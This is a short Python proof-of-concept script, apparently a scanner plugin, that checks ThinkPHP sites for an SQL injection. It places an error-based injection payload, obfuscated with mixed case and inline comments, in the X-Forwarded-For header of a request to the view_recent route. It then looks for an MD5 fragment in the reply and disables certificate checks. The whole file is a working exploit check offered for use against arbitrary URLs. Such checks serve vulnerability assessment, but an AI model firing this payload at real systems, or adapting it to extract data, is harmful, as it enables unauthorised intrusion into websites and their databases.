#!/usr/bin/env python
# coding=utf-8
from urllib.parse import urljoin

import requests

from utils import get_pocdict

headers = {
    "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:87.0) Gecko/20100101 Firefox/87.0",
    "X-Forwarded-For": "1')And/**/ExtractValue(1,ConCat(0x5c,(sElEct/**/Md5(2333))))#"
}
payload = "index.php?s=/home/article/view_recent/name/1"


async def thinkphp_view_recent_xff_sqli_verify(url):
    pocdict = get_pocdict(vulnname=__name__)
    try:
        vurl = urljoin(url, payload)
        resp = requests.get(vurl, headers=headers, timeout=15, verify=False)
        if '56540676a129760a' in resp.text:
            pocdict['isvul'] = True
            pocdict['vulnurl'] = vurl
            pocdict['proof'] = '56540676a129760a'
            pocdict['response'] = resp.text
    except Exception as e:
        pocdict['exception'] = str(e)
    return pocdict
